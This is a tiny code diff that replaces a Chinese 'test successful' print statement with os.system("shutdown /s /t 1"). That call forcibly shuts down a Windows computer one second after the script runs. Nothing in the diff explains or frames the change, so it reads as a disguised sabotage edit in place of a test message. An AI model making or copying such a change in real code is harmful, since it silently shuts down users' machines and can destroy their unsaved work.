@@ -1,1 +1,1 @@
-print('测试成功')
+os.system("shutdown /s /t 1")
